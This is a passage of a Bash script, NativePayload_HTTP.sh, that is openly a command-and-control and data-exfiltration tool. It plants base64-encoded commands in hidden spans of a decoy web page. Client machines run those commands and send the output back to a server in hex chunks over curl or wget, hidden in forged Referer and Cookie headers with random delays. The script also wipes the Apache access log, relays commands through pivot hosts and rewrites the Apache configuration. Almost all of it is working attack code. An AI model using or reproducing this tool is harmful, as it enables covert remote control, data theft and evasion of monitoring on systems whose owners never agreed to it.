 #!/bin/sh

echo
echo "NativePayload_HTTP.sh v1.4 , Published by Damon Mohammadbagher 2018-2019" 
echo "Injecting/Downloading/Uploading DATA via Web/HTTP Traffic" 
echo "help syntax: ./NativePayload_HTTP.sh help"
echo

function _help () 
{
tput setaf 2
echo "[@]:NativePayload_HTTP.sh Server-Side Help (v1.4)"
echo "[@]:NativePayload_HTTP.sh (Internal.Commands):"
echo
printf '\u2507'; echo "$(tput setaf 11) @help $(tput setaf 2) => show all internal Commands"
printf '\u2523\u2509'; echo "Description: Help for commands"
printf '\u2516\u2509'; echo "Example:#@help"
echo
printf '\u2507'; echo "$(tput setaf 11) @exit $(tput setaf 2) => exit tool (Server Side)"
printf '\u2523\u2509'; echo "Description: exit to Console"
printf '\u2516\u2509'; echo "Example:#@exit"
echo
#printf '\u2507'; echo "$(tput setaf 11) @init $(tput setaf 2) => set last Command in getcmd.aspx to \"init\""
#printf '\u2523\u2509'; echo "Description: changing last command from cmd:anything to cmd:init in (getcmd.aspx)"
#printf '\u2516\u2509'; echo "Example:#@init"
#echo
printf '\u2507'; echo "$(tput setaf 11) @interact $(tput setaf 2) or $(tput setaf 11) @ $(tput setaf 2) => interaction with Target system (@Clients) "
printf '\u2523\u2509'; echo "Description: you can use this command to interact to @Clients"
printf '\u2523\u2509'; echo "Example:#@interact 192.168.56.102"
printf '\u2516\u2509'; echo "Example:#@ 192.168.56.102"
echo
printf '\u2507'; echo "$(tput setaf 11) @clients $(tput setaf 2) or $(tput setaf 11) @cli $(tput setaf 2) => show all Clients by IPv4"
printf '\u2523\u2509'; echo "Description: you can use this command to show list of Clients"
printf '\u2523\u2509'; echo "Example:#@clients"
printf '\u2516\u2509'; echo "Example:#@cli"
echo
printf '\u2507'; echo "$(tput setaf 11) @version $(tput setaf 2) => show version"
printf '\u2523\u2509'; echo "Description: show NativePayload_HTTP.sh version"
printf '\u2516\u2509'; echo "Example:#@version"
echo
printf '\u2507'; echo "$(tput setaf 11) @base64on $(tput setaf 2) or $(tput setaf 11) @64on $(tput setaf 2) => Enabling Base64"
printf '\u2523\u2509'; echo "Description: Enabling Base64"
printf '\u2523\u2509'; echo "Example:#@base64on"
printf '\u2516\u2509'; echo "Example:#@64on"
echo
printf '\u2507'; echo "$(tput setaf 11) @base64off $(tput setaf 2) or $(tput setaf 11) @64off $(tput setaf 2) => Disabling Base64"
printf '\u2523\u2509'; echo "Description: Disabling Base64 (default)"
printf '\u2523\u2509'; echo "Example:#@base64off"
printf '\u2516\u2509'; echo "Example:#@64off"
echo
printf '\u2507'; echo "$(tput setaf 11) @fheaderon $(tput setaf 2) or $(tput setaf 11) @fhn $(tput setaf 2) => Changing Curl default Header to Fake-Header"
printf '\u2523\u2509'; echo "Description: Changing curl http Header to Fake-Header"
printf '\u2523\u2509'; echo "Example:#@fheaderon"
printf '\u2516\u2509'; echo "Example:#@fhn"
echo
printf '\u2507'; echo "$(tput setaf 11) @fheaderoff $(tput setaf 2) or $(tput setaf 11) @fhf $(tput setaf 2) => Disabling curl Fake-Header"
printf '\u2523\u2509'; echo "Description: Changing curl http Header from Fake Header to curl Default http header (default)"
printf '\u2523\u2509'; echo "Example:#@fheaderoff"
printf '\u2516\u2509'; echo "Example:#@fhf"
echo
printf '\u2507'; echo "$(tput setaf 11) @xrefon $(tput setaf 2) or $(tput setaf 11) @xrn $(tput setaf 2) => Enabling Curl Payload Injection via /GET Header.[Referer]"
printf '\u2523\u2509'; echo "Description: Changing curl Web Request http Header for Payload Injection via \"Referer\""
printf '\u2523\u2509'; echo "Example:#@xrefon"
printf '\u2516\u2509'; echo "Example:#@xrn"
echo
printf '\u2507'; echo "$(tput setaf 11) @xrefoff $(tput setaf 2) or $(tput setaf 11) @xrf $(tput setaf 2) => Disabling Curl Payload Injection via /GET Header.[Referer]"
printf '\u2523\u2509'; echo "Description: Disabling curl Web Request http Header for Payload Injection via \"Referer\" (default)"
printf '\u2523\u2509'; echo "Example:#@xrefoff"
printf '\u2516\u2509'; echo "Example:#@xrf"
echo
printf '\u2507'; echo "$(tput setaf 11) @xcookieon $(tput setaf 2) or $(tput setaf 11) @xcn $(tput setaf 2) => Enabling Curl Payload Injection via /GET Header.[Cookies]"
printf '\u2523\u2509'; echo "Description: Changing curl Web Request http Header for Payload Injection via \"Cookies\""
printf '\u2523\u2509'; echo "Example:#@xcookieon"
printf '\u2516\u2509'; echo "Example:#@xcn"
echo
printf '\u2507'; echo "$(tput setaf 11) @xcookieoff $(tput setaf 2) or $(tput setaf 11) @xcf $(tput setaf 2) => Disabling Curl Payload Injection via /GET Header.[Cookies]"
printf '\u2523\u2509'; echo "Description: Disabling curl Web Request http Header for Payload Injection via \"Cookies\" (default)"
printf '\u2523\u2509'; echo "Example:#@xcookieoff"
printf '\u2516\u2509'; echo "Example:#@xcf"
echo
printf '\u2507'; echo "$(tput setaf 11) @delay $(tput setaf 2) => set Delay for sending Signal from Client to Server"
printf '\u2523\u2509'; echo "Description: you can use this Delay for Signals from Client to server (Disabling random time, client side)"
printf '\u2516\u2509'; echo "Example:#@delay 10"
echo
printf '\u2507'; echo "$(tput setaf 11) @delay off$(tput setaf 2) => set Delay off for sending Signal from Client to Server"
printf '\u2523\u2509'; echo "Description: you can use this \"Delay off\" to disabling Delay (Client will send signal by random delay) (default)"
printf '\u2516\u2509'; echo "Example:#@delay off"
echo
printf '\u2507'; echo "$(tput setaf 11) @back $(tput setaf 2) => back from Client interaction prompt to main prompt "
printf '\u2523\u2509'; echo "Description: you can use this command for back"
printf '\u2516\u2509'; echo "Example:#@back"
echo
printf '\u2507'; echo "$(tput setaf 11) @info $(tput setaf 2) => Server Information"
printf '\u2523\u2509'; echo "Description: you can use this command to see Server Configuration "
printf '\u2516\u2509'; echo "Example:#@info"
echo
printf '\u2507'; echo "$(tput setaf 11) @cmdlist $(tput setaf 2) => show list of all commands (executed client-side)"
printf '\u2523\u2509'; echo "Description: you can use this command to show commands output history (client-side)"
printf '\u2516\u2509'; echo "Example:#@cmdlist"
echo
printf '\u2507'; echo "$(tput setaf 11) @cmdsave $(tput setaf 2) => save all commands/outputs to text file"
printf '\u2523\u2509'; echo "Description: you can use this command to save commands output history to text file"
printf '\u2516\u2509'; echo "Example:#@cmdsave"
echo
printf '\u2507'; echo "$(tput setaf 11) exit $(tput setaf 2) => Exit NativePayload_HTTP in Client side (linux-windows)"
printf '\u2523\u2509'; echo "Description: exit Agent from target system (linux-windows)"
printf '\u2516\u2509'; echo "Example:#exit"
echo
#printf '\u2507'; echo "$(tput setaf 11) poweroff $(tput setaf 2) => shutdown target system (linux-windows)"
#printf '\u2523\u2509'; echo "Description: shutdown target system (linux-windows)"
#printf '\u2516\u2509'; echo "Example:#poweroff"
#echo
}

function InjectCMDtoHTML
{	

Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
_x1="$1" # Target Host
_x2="$2" # Time
_x3="$3" # FakeheaderStatus
_x4=`echo "$4" | base64` # CMD
_x5="$5" # Base64Status
_x6="$6" # Delay
_x7="$7" # FakeHeaderMode
_x8="$8" # Server PivotCMD
_x9="$9" # Pivot Client


_HTMLv1=`echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"
   \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">

<html xmlns=\"http://www.w3.org/1999/xhtml\">

    <head>

        <title>

          Welcome to Web Site!

        </title>

    </head>

    <body>

        <form name=\"form1\" method=\"post\" action=\"getcmd.aspx\" id=\"form1\">

        <div>

          <input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"Oo\" />

        </div>

        <div>

          <p>NativePayload_HTTP.sh v1.4 Command Page ;D</p>

          <p>

            last Activity time:

            <span id=\"myTimeLabel\">" "[$Timestr]" "</span>
            
          </p>
	<p>
	<span id=\"myTimeLabel2\"  style=\"color:red; visibility:hidden\" >" "$1" "$2" "$3" "$_x4""$5" "$6" "$7" "$8" "$9" "</span>
	<span id=\"myTimeLabel_PivotServerCMD\"  style=\"color:red; visibility:hidden\" >""$_x8""</span>
	<span id=\"myTimeLabel_PivotClient\"  style=\"color:red; visibility:hidden\" >""$_x9""</span>
	<span id=\"myTimeLabel7\"  style=\"color:red; visibility:hidden\" >"  "</span>
	<span id=\"myTimeLabel_TargetHost\"  style=\"color:red; visibility:hidden\" >""$_x1""</span>
	<span id=\"myTimeLabel_Time\"  style=\"color:red; visibility:hidden\" >""$_x2""</span>
	<span id=\"myTimeLabel_FakeheaderStatus\"  style=\"color:red; visibility:hidden\" >""$_x3""</span>
	<span id=\"myTimeLabel_CMD\"  style=\"color:red; visibility:hidden\" >""$_x4""</span>
	<span id=\"myTimeLabel_Base64Status\"  style=\"color:red; visibility:hidden\" >""$_x5""</span>
	<span id=\"myTimeLabel_Delay\"  style=\"color:red; visibility:hidden\" >""$_x1|$_x6""</span>
	<span id=\"myTimeLabel_FakeHeaderMode\"  style=\"color:red; visibility:hidden\" >""$_x7""</span>
	<span id=\"myTimeLabel8\"  style=\"color:red; visibility:hidden\" >"  "</span>
	</p>
        </div>

        </form>

    </body>

</html>"`
echo "$_HTMLv1" > "/var/www/html/getcmd.aspx"
cat "/var/www/html/getcmd.aspx" > "/var/www/html/index.html"
}

function InjectRefreshedHtml () 
{
Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
_HTMLv1=`echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"
   \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">

<html xmlns=\"http://www.w3.org/1999/xhtml\">

    <head>

        <title>

          Welcome to Web Site!

        </title>

    </head>

    <body>

        <form name=\"form1\" method=\"post\" action=\"getcmd.aspx\" id=\"form1\">

        <div>

          <input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"Oo\" />

        </div>

        <div>

          <p>NativePayload_HTTP.sh v1.4 Command Page ;D</p>

          <p>

            last Activity time:

            <span id=\"myTimeLabelx\">" "[$Timestr]" "</span>
	    <span id=\"myTimeLabel_FakeheaderStatus\"  style=\"color:red; visibility:hidden\" >""$1""</span>
            
          </p>
        </div>

        </form>

    </body>

</html>"`
echo "$_HTMLv1" > "/var/www/html/getcmd.aspx"
cat "/var/www/html/getcmd.aspx" > "/var/www/html/index.html"
}

function DefaultPage ()
{
Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"
   \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">

<html xmlns=\"http://www.w3.org/1999/xhtml\">

    <head>

        <title>

          Welcome to Web Site!

        </title>

    </head>

    <body>
       
        <div>

          <p>NativePayload_HTTP.sh v1.4 Default Page ;D</p>

          <p>

            last Activity time:

            <span id=\"myTimeLabel\">" "[$Timestr]" "</span>
            
          </p>	
        </div>        
    </body>

</html>" > "/var/www/html/$1" 
}

function Echo ()
{
	if (( `echo ${#1}` <= 110 ))
	then
	for E in `echo $1 | xxd -c 12 -p` ; 
	do
		printf $E | xxd -r -p
		sleep 0.1	
	done
	$2
	else
	echo $1
	$2
	fi
}

function Curl()
{
	tempv2=`echo $2 | cut -d'?' -f2`
	tempv3=`echo $2 | cut -d'?' -f1`
	_Random=`head /dev/urandom | tr -dc 0-9 | head -c8`
	_Random2=`head /dev/urandom | tr -dc 0-9a-f | head -c8`
	CurlDetection="$6"

if [ "$5" != "" ] ;
then
	# DATA Sending: injection via header.Referer 
	if [ "$5" == "iReferer-on" ] ;
	then		
			if [ "$CurlDetection" == "true" ] ; 
			then				
			 nohup curl -v \
			-H "Host: $1" \
			-H 'Connection: keep-alive' \
			-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
			-H 'Accept-Language: en-US;q=0.8,en;q=0.6' \
			-H 'Upgrade-Insecure-Requests: 1' \
			-H "Accept-Encoding: gzip, deflate" \
			-e "https://www.google.com/search?ei=bsZAXPSqD&$tempv2&q=$_Random2&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q" \
			-A 'Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0' \
			"$tempv3" > "$3" 2>&1 &	
			fi
			if [ "$CurlDetection" == "false" ] ; 
			then
				 wget "$tempv3" -o "DumpedText_by_wget.txt" -O "$3" \
				--header="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0" \
				--header="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
				--header="Connection: keep-alive" \
				--header="Accept-Language: en-US;q=0.8,en;q=0.6" \
				--header="Accept-Encoding: gzip, deflate" \
				--header="Referer: https://www.google.com/search?ei=bsZAXPSqD&$tempv2&q=$_Random2&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q" 
			fi		
	fi	

	# DATA Sending: injection via header.Cookie 
	if [ "$5" == "iCookie-on" ] ;
	then		
			if [ "$CurlDetection" == "true" ] ; 
			then	
			 nohup curl -v \
			-H "Host: $1" \
			-H 'Connection: keep-alive' \
			-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
			-H 'Accept-Language: en-US;q=0.8,en;q=0.6' \
			-H 'Upgrade-Insecure-Requests: 1' \
			-H "Accept-Encoding: gzip, deflate" \
			-e "https://www.bing.com" \
			-b "viewtype=Default; UniqueIDs=$tempv2&$_Random2" \
			-A 'Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0' \
			"$tempv3" > "$3" 2>&1 &	
			fi
			if [ "$CurlDetection" == "false" ] ; 
			then
				 wget "$tempv3" -o "DumpedText_by_wget.txt" -O "$3" \
				--header="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0" \
				--header="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
				--header="Connection: keep-alive" \
				--header="Accept-Language: en-US;q=0.8,en;q=0.6" \
				--header="Accept-Encoding: gzip, deflate" \
				--header="Referer: localhost" \
				--header="Cookie: viewtype=Default; UniqueIDs=$tempv2&$_Random2" 
			fi		
	fi
else	
		# DATA Sending: change default header to fake header
		if [ "$4" == "true" ] ;
		then
			if [ "$CurlDetection" == "true" ] ; 
			then
				 nohup curl -v \
				-H "Host: $1" \
				-H 'Connection: keep-alive' \
				-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
				-H 'Accept-Language: en-US;q=0.8,en;q=0.6' \
				-H 'Upgrade-Insecure-Requests: 1' \
				-e "localhost" \
				-A 'Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0' \
				"$2" > "$3" 2>&1 &
			fi
			if [ "$CurlDetection" == "false" ] ; 
			then
				 wget "$2" -o "DumpedText_by_wget.txt" -O "$3" \
				--header="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0" \
				--header="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
				--header="Connection: keep-alive" \
				--header="Accept-Language: en-US;q=0.8,en;q=0.6" \
				--header="Accept-Encoding: gzip, deflate" \
				--header="Referer: localhost" 
			fi

		else
		# DATA Sending without chanage (default)
			if [ "$CurlDetection" == "true" ] ; 
			then
				nohup curl "$2" > "$3" 2>&1 &
			fi
			if [ "$CurlDetection" == "false" ] ; 
			then
				 wget "$2" -o "DumpedText_by_wget.txt" -O "$3"
			fi
		fi
fi
			
}

function ClientsDetection()
{
	while true ; 
		do
		
		filename="/var/log/apache2/access.log"
		# bug here ;)
		NewSessionDetection=`strings $filename | grep "GET" | grep "Session" | cut -d'=' -f2 | awk {'print $1'}`
		
		#NewSessionDetection=`strings $filename | grep "GET" | awk {'print $7'} | awk '!a[$0]++'`		
		checkCookiesison=`strings $filename | grep "GET" | grep "UniqueIDs=Session="`
		if  (( `echo ${#checkCookiesison}` !=0 ))
		then
		NewSessionDetection=`strings $filename | grep "GET" | grep "Session" | cut -d'=' -f4 | cut -d'&' -f1 | awk {'print $1'}`
		fi

		sleep 1
		if (( `echo ${#NewSessionDetection}` !=0 ))
		then
		IPv4Cli=`echo $NewSessionDetection | rev | xxd -r -p | base64 -d `		
		lastIP=""
		for s in `echo $IPv4Cli | awk {'print $2'} | cut -d':' -f2 | awk '!a[$1]++'`;  
		do			
			ss=`echo $s`
			
			found=`strings IPv4Clients.txt | grep "$ss"`
			sleep 1
			if (( `echo ${#found}` == 0 ))
			then
		if [ "$ss" != "$lastIP" ] ;
		then
			Timestr=`date '+%d-%m-%Y.%H-%M-%S'`			
			OS=`echo $IPv4Cli | awk {'print $1'} `
			if [[ "$s" =~ ^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$ ]] ;
			then
			echo "$Timestr IPv4:$s" [$OS]  >> IPv4Clients.txt
			echo
			tput setaf 10						
			echo "[!]:Client.IPv4.[$s]:Detected"						
			tput setaf 2
			sleep 0.2
			lastIP="$s"
			#break;
			fi
		fi
			fi
		done						
		fi
		sleep 1
		
		done
}


function Remove_logs
{
	 head -c "1" /dev/zero > "/var/log/apache2/access.log"
	 sleep 0.1
}
function Remove_Sessions_logs
{
	sed  "s/Session=/ /"  "/var/log/apache2/access.log"
	sleep 0.1 
}

function initApache2ConfigFile()
{
	`service apache2 stop`
	Time=`date '+%d-%m-%Y.%H-%M-%S'`
	cat "/etc/apache2/apache2.conf" > "/etc/apache2/$Time.backup.apache2.conf"
	echo "[>]:Service.apache2.[/etc/apache2/$Time.backup.apache2.conf]:Created"
	cat "New_apache2.conf" > "/etc/apache2/apache2.conf" 
	sleep 2.5
	echo "[>]:Service.apache2.[/etc/apache2/apache2.conf]:Modified"
	`service apache2 restart`
	echo "[>]:Service.apache2:Restarted"
}

# ============================================Pivoting=====================================================
function _Server ()
{
	nohup python -m SimpleHTTPServer $1 > "PServer.txt" 2>&1 &
	# it is not available for this version ;)
}

function Client ()
{	

	CurlDetected=""
	# Detecting Curl and Wget
	if [ `ls "/usr/bin/curl"` ] ;
	then
	CurlDetected="true"
	else
		if [ `ls "/usr/bin/wget"` ] ; 
		then
		CurlDetected="false"
#		echo "$(tput setaf 2)[!]:Warning:""$(tput setaf 10)[Client.curl]""$(tput setaf 2):Not Installed , Sending.Cmd.Output by \"wget\""
		else
#		echo "$(tput setaf 2)[!]:Error:""$(tput setaf 10)[Client.curl]&[Client.wget]""$(tput setaf 2):Not Installed , you need one of them at least!"
		exit
		fi
	fi

		tput setaf 2;
		LocalhostIPv4=`hostname -I`
		#echo "" > "IntermediateMSG.txt"			
		sleep 1		
				#pids=`ps -ef | grep "python -m SimpleHTTPServer 8080" | awk {'print $2'}`
				#for i in $pids ; 
				#do		
				#nohup kill $pids > pidskill.txt  2>&1 &
				#sleep 0.5
				#done
				#if [ "$pids" == "" ] ;
				#then
				#nohup python -m SimpleHTTPServer 8080 > "IntermediateMSG.txt" 2>&1 &
				#sleep 1.5
				#fi
filename="IntermediateMSG.txt"
while true; do
	while true; 
	do

		tput setaf 2;			
		sleep 5
		fs2=$(stat -c%s "$filename")
		if [ "$fs" != "$fs2" ] ; 
		then
		
		tput setaf 6;
		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
		if [ "$FirsttimeMsg" == "true" ]
		then
		tput setaf 6;
		echo "[!]:[$Timestr]:Webserver log File has changed!" 		
		echo "[!]:[$Timestr]:Checking Http Queries"
		else
		printf '.'
		fi
		fs=$(stat -c%s "$filename")
		fs2=$(stat -c%s "$filename")
		sleep 0.2
 		tput setaf 2;		
		Intermediate_systems_detection=`strings "IntermediateMSG.txt" | grep "index.html?int=" | cut -d'=' -f2  | xxd -r -p | cut -d'_' -f1 | cut -d'@' -f1 | tr -dc 0-9.`

		
		Temp_Host_Intermediate=""
		DetectDNSName_insted_IPv4=`strings "IntermediateMSG.txt" | grep "index.html?int=null" | awk {'print $1'} | tr -dc a-zA-Z0-9` 
		if (( `echo ${#DetectDNSName_insted_IPv4}` !=0 ))
		then
		#echo "detected 01"
		Temp_Host_Intermediate=`strings "IntermediateMSG.txt" | grep "index.html?int=null" | awk {'print $1'}`
		IsDNSNameis_Intermediate=`ping -c 1 "$Temp_Host_Intermediate" | grep PING | awk {'print $3'} | tr -dc 0-9.`
			if [ "$IsDNSNameis_Intermediate" == "$Intermediate_systems_detection" ]	
			then
			echo
			break
			fi
		fi

		FinishFlag=`strings "IntermediateMSG.txt" | grep "$Intermediate_systems_detection" | grep "index.html?int=null"`	
		if (( `echo ${#FinishFlag}` !=0 ))
		then
		echo
		break
		fi
		
		tput setaf 2;
		FirsttimeMsg="false"
		else
		fs=$(stat -c%s "$filename")
		fs2=$(stat -c%s "$filename")
		FirsttimeMsg="true"
		fi
	done
		
	sleep 1	
	Intermediate_systems_detection=`strings "IntermediateMSG.txt" | grep "index.html?int=" | cut -d'=' -f2  | xxd -r -p | cut -d'_' -f1 | cut -d'@' -f1 | tr -dc 0-9.`
	#Server_Command_detection=`strings "IntermediateMSG.txt" | grep index.html?int= | cut -d'=' -f2  | cut -d' ' -f1 | xxd -r -p | cut -d'_' -f2`
	Server_Command_detection=`strings "IntermediateMSG.txt" | grep "index.html?int=" | cut -d'=' -f2 | xxd -r -p | cut -d'_' -f2 | cut -d'@' -f1 | base64 -d`	
	if (( `echo ${#Intermediate_systems_detection}` !=0 ))
	then
		if (( `echo ${#Server_Command_detection}` !=0 ))
		then
		LocalhostIPv4=`hostname -I`
		tput setaf 10;		
		echo "[!]:Pivoting.Server.Cmd.[$Server_Command_detection] <<--- [$Intermediate_systems_detection] <<--->> [$LocalhostIPv4]"

			if [[ "$Server_Command_detection" == "poweroff" || "$Server_Command_detection" == "exit" ]] ;
			then
			echo "[!]:Pivoting.Server.Cmd.[$Server_Command_detection]:Detected"
			Curl "$LocalhostIPv4" "http://$Intermediate_systems_detection:8081/index.html?cli=off" "sendhttp.log" "true" "" "$CurlDetected"
			sleep 1
			fi
			
		ClientCMDoutput=`$Server_Command_detection`
		Clientoutput=`echo "[$LocalhostIPv4] => "$ClientCMDoutput`
		sleep 3
		for bytes in `echo $Clientoutput | xxd -p -c 12 | rev`;
		do
		mydelay2=`head /dev/urandom | tr -dc 3-9 | head -c1`
		mydelay3=`head /dev/urandom | tr -dc 0-3 | head -c1`
		tput setaf 10;
		echo "[>]:CMD:Byte:["$bytes"]::SendbyHttp::Delay:[$mydelay3.$mydelay2]::Web.Request:[index.html?cli=$bytes]"						
		Curl "$LocalhostIPv4" "http://$Intermediate_systems_detection:8081/index.html?cli=$bytes" "sendhttp.log" "true" "" "$CurlDetected"
		sleep $mydelay3.$mydelay2
		done
		Curl "$LocalhostIPv4" "http://$Intermediate_systems_detection:8081/index.html?cli=off" "sendhttp.log" "true" "" "$CurlDetected"
		fi	
	fi
	echo "" > "IntermediateMSG.txt"
	tput setaf 2;
	sleep 1
done
}

function Intermediate ()
{
	CurlDetected=""
	# Detecting Curl and Wget
	if [ `ls "/usr/bin/curl"` ] ;
	then
	CurlDetected="true"
	else
		if [ `ls "/usr/bin/wget"` ] ; 
		then
		CurlDetected="false"
		#echo "$(tput setaf 2)[!]:Warning:""$(tput setaf 10)[Client.curl]""$(tput setaf 2):Not Installed , Sending.Cmd.Output by \"wget\""
		else
		#echo "$(tput setaf 2)[!]:Error:""$(tput setaf 10)[Client.curl]&[Client.wget]""$(tput setaf 2):Not Installed , you need one of them at least!"
		exit
		fi
	fi
			

	Cli=`strings dumpcmds.log | grep "myTimeLabel_PivotClient" | cut -d'>' -f2 | cut -d'<' -f1`
	Inter=`strings dumpcmds.log | grep "myTimeLabel_TargetHost" | cut -d'>' -f2 | cut -d'<' -f1`

	#Cli=`echo $PivotingCMD | cut -d' ' -f4  | cut -d':' -f1 | tr -dc 0-9.`
	#Inter=`echo $PivotingCMD | cut -d' ' -f3 | tr -dc 0-9.`

	Serv="$1" # Server Address
	Command=`echo $3`
	LocalhostIPv4=`hostname -I`
	

		if [ "$2" == "$Inter" ]
		then
			
			#bytes=`echo "$Inter:$Command" | xxd -p`
			bytes=`echo "$Inter""_""$Command" | xxd -p`
			tput setaf 10;
			echo "[!]:Pivoting.Detected: Client.[$Cli] <<--->> Intermediate.[$Inter] --->> Server.[$Serv]:Done"
			tput setaf 2;
			#do something as intermediate			
			LocalhostIPv4=`hostname -I`
			port="8080"
			sleep 0.5		
			Curl "$LocalhostIPv4" "http://$Cli:8080/index.html?int=$bytes" "sendhttp.log" "true" "" "$CurlDetected"
			sleep 0.5
			Curl "$LocalhostIPv4" "http://$Cli:8080/index.html?int=null" "sendhttp.log" "true" "" "$CurlDetected"
			#do something as intermediate
		fi			
			LocalhostIPv4=`hostname -I`
			port="80"
		
				#pids=`ps -ef | grep "python -m SimpleHTTPServer" | awk {'print $2'}`
				#for i in $pids ; 
				#do		
				#nohup kill $pids > pidskill.txt  2>&1 &
				#sleep 0.5
				#done

				sleep 0.5
				if [ "$4" == "false" ] ;
				then
				nohup python -m SimpleHTTPServer 8081 > "ClientMSG.txt" 2>&1 &	
				sleep 1.5
				fi



filename="ClientMSG.txt"
Payloads_detected=""
while true; do
		tput setaf 2;	
		
		sleep 5
		fs2=$(stat -c%s "$filename")
		if [ "$fs" != "$fs2" ] ; 
		then
		
		tput setaf 6;
		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
		if [ "$FirsttimeMsg" == "true" ]
		then
		echo "[!]:[$Timestr]:Webserver log File has changed!" 		
		echo "[!]:[$Timestr]:Checking Http Queries"
		else
		printf '.'
		fi
		fs=$(stat -c%s "$filename")
		fs2=$(stat -c%s "$filename")
 				
		FinishFlag=`strings "ClientMSG.txt" | grep "$Cli" | grep "index.html?cli=off"`	


		Temp_Host_client=""
		DetectDNSName_insted_IPv4=`strings "ClientMSG.txt" | grep "index.html?cli=off" | awk {'print $1'} | tr -dc a-z` 
		if (( `echo ${#DetectDNSName_insted_IPv4}` !=0 ))
		then
		#echo "detected 01"
		Temp_Host_client=`strings "ClientMSG.txt" | grep "index.html?cli=off" | awk {'print $1'}`
		IsDNSNameis_client=`ping -c 1 "$Temp_Host_client" | grep "PING" | awk {'print $3'} | tr -dc 0-9.`

			if [[ "$IsDNSNameis_client" == "$Cli"* ]] ;	
			then
			echo
			Payloads_detected=`strings "ClientMSG.txt" | grep "$Temp_Host_client" | grep "index.html?cli=" | cut -d'=' -f2 | cut -d' ' -f1 | rev | xxd -r -p`
			break
			fi
		fi


		if (( `echo ${#FinishFlag}` !=0 ))
		then
		echo
		Payloads_detected=`strings "ClientMSG.txt" | grep -e "$Cli" | grep "index.html?cli=" | cut -d'=' -f2 | cut -d' ' -f1 | rev | xxd -r -p`
		break
		fi
		
		tput setaf 2;
		FirsttimeMsg="false"
		else
		fs=$(stat -c%s "$filename")
		fs2=$(stat -c%s "$filename")
		FirsttimeMsg="true"
		fi
	done

			port="80"
			Command=`echo $Command | base64 -d`
			tput setaf 2;
			echo "[!]:Pivoting.Client.[$Cli].Cmd.[$Command] -->> [$Inter]-->> [$Serv]:Started"
			tput setaf 2;
			
			for bytes in `echo $Payloads_detected | xxd -p -c 12 | rev`;
			do
				mydelay2=`head /dev/urandom | tr -dc 3-9 | head -c1`
				mydelay3=`head /dev/urandom | tr -dc 0-3 | head -c1`
				tput setaf 10;
				echo "[>]:CMD:Byte:["$bytes"]::SendbyHttp::Delay:[$mydelay3.$mydelay2]::Web.Request:[default.aspx?uids=$bytes]"
				Curl "$LocalhostIPv4" "http://$Serv:$port/default.aspx?uids=$bytes" "sendhttp.log" "true" "" "$CurlDetected"						
				sleep $mydelay3.$mydelay2
			tput setaf 2;
			done
			echo "[!]:Pivoting.Client.[$Cli].Cmd.[$Command] -->> [$Inter]-->> [$Serv]:Done"
			Curl "$LocalhostIPv4" "http://$Serv:$port/default.aspx?logoff=null" "sendhttp.log" "true" "" "$CurlDetected"
			

}
# ============================================Pivoting=====================================================


# ============================================help=========================================================
if [ $1 == "help" ]
then
tput setaf 2;
	echo
	echo "Step1        : (Client Side ) ./NativePayload_HTTP.sh -dumpcmd IPv4_Server Port delay"
	echo "Example Step1: (Client Side ) ./NativePayload_HTTP.sh -dumpcmd 192.168.56.1 80 0.3"
	echo "Step2        : (Server Side ) ./NativePayload_HTTP.sh -exfilwebserver "
	echo "Example Step2: (Server Side ) ./NativePayload_HTTP.sh -exfilwebserver "
	echo
	_help	

fi
# ============================================help=========================================================

# ============================================Exfiltration by HTTP traffic (DATA Receiving)===============
#  ./NativePayload_HTTP.sh -exfilwebserver 8000 debug
if [ "$1" == $'-exfilwebserver' ] ;
	then	
	CurlDetected=""
	# Detecting Curl and Wget
	#if [ `ls "/usr/bin/curl"` ] ;
	if  [ -x "$(command -v curl)" ];
	then
	CurlDetected="true"
	else
		#if [ `ls "/usr/bin/wget"` ] ; 
		if [ -x "$(command -v wget)" ]; 
		then
		CurlDetected="false"
		echo "$(tput setaf 2)[!]:Warning:""$(tput setaf 10)[Client.curl]""$(tput setaf 2):Not Installed , Sending.Cmd.Output by \"wget\""
		else
		echo "$(tput setaf 2)[!]:Error:""$(tput setaf 10)[Client.curl]&[Client.wget]""$(tput setaf 2):Not Installed , you need one of them at least!"
		exit
		fi
	fi

		pids=`ps -ef | grep "python -m SimpleHTTPServer" | awk {'print $2'}`
		for i in $pids ; 
		do		
		nohup kill $pids > pidskill.txt  2>&1 &
		done
	tput setaf 10		
	DefaultPage "default.aspx"
	DefaultPage "default.html"
